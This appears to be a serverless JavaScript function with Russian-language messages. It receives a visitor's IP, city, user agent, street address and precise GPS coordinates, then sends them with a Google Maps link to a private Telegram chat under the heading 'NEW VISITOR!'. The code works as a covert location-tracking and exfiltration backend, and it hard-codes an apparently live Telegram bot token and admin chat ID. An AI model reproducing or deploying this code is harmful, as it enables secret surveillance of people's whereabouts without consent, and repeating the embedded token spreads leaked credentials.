const TELEGRAM_TOKEN = "8496981671:AAFL-4G4xFDUWj-eal5yJNiqIzxjIvqw2lo";
const ADMIN_ID = "7617539069";

exports.handler = async function(event, context) {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const data = JSON.parse(event.body);
        
        let device = '💻 ПК';
        const ua = data.userAgent || '';
        if (/mobile/i.test(ua)) device = '📱 Телефон';
        if (/tablet/i.test(ua)) device = '📟 Планшет';
        
        let message = `🔔 **НОВЫЙ ПОСЕТИТЕЛЬ!**\n`;
        message += `🕐 Время: ${new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })}\n`;
        message += `🌐 IP: ${data.ip || '?'}\n`;
        message += `📍 Гео: ${data.city || '?'}, ${data.country || '?'}\n`;
        message += `📱 Устройство: ${device}\n`;
        message += `🔗 Адрес: ${data.addr || 'Не указан'}\n`;

        if (data.lat && data.lng) {
            message += `📍 **ТОЧНЫЕ КООРДИНАТЫ:**\n`;
            message += `🗺 https://www.google.com/maps?q=${data.lat},${data.lng}\n`;
        }

        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        return { statusCode: 200, body: JSON.stringify({ ok: true }) };
    } catch (error) {
        return { statusCode: 500, body: JSON.stringify({ error: 'Internal Server Error' }) };
    }
};
